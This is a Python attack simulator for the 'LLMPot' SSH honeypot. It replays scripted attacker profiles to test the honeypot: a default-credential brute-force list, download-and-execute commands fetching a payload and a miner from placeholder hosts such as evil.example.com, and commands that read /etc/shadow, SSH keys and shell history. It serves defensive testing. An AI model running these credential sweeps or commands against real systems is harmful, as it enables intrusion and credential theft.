#!/usr/bin/env python3
"""
LLMPot — Attack Simulator
Safely simulates various attacker profiles against the honeypot.
"""

import paramiko
import time
import random
import sys
import os
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import SSH_PORT
from utils.logger import get_logger

logger = get_logger("simulator")

# ─── Attacker Profiles ───────────────────────────────────────────────────────

PROFILES = {
    "scout": {
        "description": "Quick reconnaissance — checks system info",
        "credentials": [("root", "root"), ("admin", "admin")],
        "commands": [
            "whoami", "id", "uname -a", "hostname",
            "cat /etc/os-release", "df -h", "free -m",
            "uptime", "exit",
        ],
        "delay": (0.3, 1.0),
    },
    "brute_forcer": {
        "description": "Tries many credentials, minimal interaction",
        "credentials": [
            ("root", "123456"), ("root", "password"), ("root", "admin"),
            ("admin", "admin"), ("admin", "password"), ("test", "test"),
            ("user", "user"), ("root", "toor"), ("root", "root"),
            ("ubuntu", "ubuntu"), ("guest", "guest"), ("admin", "123456"),
        ],
        "commands": ["whoami", "exit"],
        "delay": (0.1, 0.3),
    },
    "malware_dropper": {
        "description": "Downloads and executes malicious files",
        "credentials": [("root", "root"), ("root", "toor")],
        "commands": [
            "whoami", "id", "uname -a",
            "cd /tmp",
            "wget http://evil.example.com/payload.sh",
            "chmod +x payload.sh",
            "./payload.sh",
            "wget http://bad.example.com/miner.bin",
            "chmod 777 miner.bin",
            "nohup ./miner.bin &",
            "rm -rf /tmp/*.sh",
            "history -c",
            "exit",
        ],
        "delay": (0.5, 2.0),
    },
    "data_exfiltrator": {
        "description": "Attempts to steal sensitive data",
        "credentials": [("root", "root"), ("admin", "admin")],
        "commands": [
            "whoami", "id",
            "cat /etc/passwd", "cat /etc/shadow",
            "cat /etc/ssh/sshd_config",
            "ls -la /root", "ls -la /root/.ssh",
            "cat /root/.bash_history",
            "netstat -tlnp",
            "ps aux",
            "cat /proc/cpuinfo",
            "cat /var/log/auth.log",
            "find / -name '*.key'",
            "exit",
        ],
        "delay": (0.5, 1.5),
    },
}


def simulate_attack(host: str = "127.0.0.1", port: int = SSH_PORT,
                    profile_name: str = "scout"):
    """Simulate an attack with the given profile."""
    profile = PROFILES.get(profile_name)
    if not profile:
        logger.error(f"Unknown profile: {profile_name}")
        return

    logger.info(f"═══ Simulating '{profile_name}' attack ═══")
    logger.info(f"    {profile['description']}")

    connected = False
    used_creds = None

    for username, password in profile["credentials"]:
        logger.info(f"Trying: {username}/{password}")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                host, port=port,
                username=username, password=password,
                timeout=10,
                look_for_keys=False,
                allow_agent=False,
            )
            logger.info(f"✓ Connected as {username}")
            connected = True
            used_creds = (username, password)
            break
        except paramiko.AuthenticationException:
            logger.info(f"✗ Auth failed for {username}/{password}")
            client.close()
            time.sleep(random.uniform(0.2, 0.5))
        except Exception as e:
            logger.error(f"Connection error: {e}")
            client.close()
            return

    if not connected:
        logger.warning("Could not authenticate with any credentials")
        return

    # Execute commands
    try:
        channel = client.invoke_shell()
        time.sleep(1)  # Wait for MOTD

        # Read MOTD
        if channel.recv_ready():
            motd = channel.recv(65535).decode("utf-8", errors="ignore")
            logger.info(f"Received MOTD ({len(motd)} chars)")

        for cmd in profile["commands"]:
            delay = random.uniform(*profile["delay"])
            time.sleep(delay)

            logger.info(f"  > {cmd}")
            channel.send(cmd + "\n")
            time.sleep(0.5)

            # Read response
            response = ""
            while channel.recv_ready():
                chunk = channel.recv(65535).decode("utf-8", errors="ignore")
                response += chunk

            if response:
                lines = response.strip().split("\n")
                for line in lines[:5]:
                    line = line.strip()
                    if line and not line.endswith("# ") and not line.endswith("$ "):
                        logger.info(f"  < {line[:100]}")
                if len(lines) > 5:
                    logger.info(f"  < ... ({len(lines) - 5} more lines)")

            if cmd == "exit":
                break

        channel.close()
        logger.info(f"✓ Session complete for profile '{profile_name}'")

    except Exception as e:
        logger.error(f"Session error: {e}")
    finally:
        client.close()


def simulate_all(host: str = "127.0.0.1", port: int = SSH_PORT,
                 concurrent: bool = False):
    """Simulate all attack profiles."""
    if concurrent:
        threads = []
        for name in PROFILES:
            t = threading.Thread(
                target=simulate_attack,
                args=(host, port, name),
            )
            threads.append(t)
            t.start()
            time.sleep(0.5)

        for t in threads:
            t.join()
    else:
        for name in PROFILES:
            simulate_attack(host, port, name)
            time.sleep(1)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="LLMPot Attack Simulator")
    parser.add_argument("-H", "--host", default="127.0.0.1",
                        help="Honeypot host (default: 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=SSH_PORT,
                        help=f"Honeypot port (default: {SSH_PORT})")
    parser.add_argument("-P", "--profile", choices=list(PROFILES.keys()) + ["all"],
                        default="all", help="Attack profile to simulate")
    parser.add_argument("-c", "--concurrent", action="store_true",
                        help="Run profiles concurrently")

    args = parser.parse_args()

    if sys.stdout.encoding.lower() != 'utf-8':
        sys.stdout.reconfigure(encoding='utf-8')

    print(r"""
    ╔══════════════════════════════════════════════╗
    ║     🔫 LLMPot Attack Simulator               ║
    ║     ⚠️ Use only against your own honeypot     ║
    ╚══════════════════════════════════════════════╝
    """)

    if args.profile == "all":
        simulate_all(args.host, args.port, args.concurrent)
    else:
        simulate_attack(args.host, args.port, args.profile)

    print("\n✓ Simulation complete!")
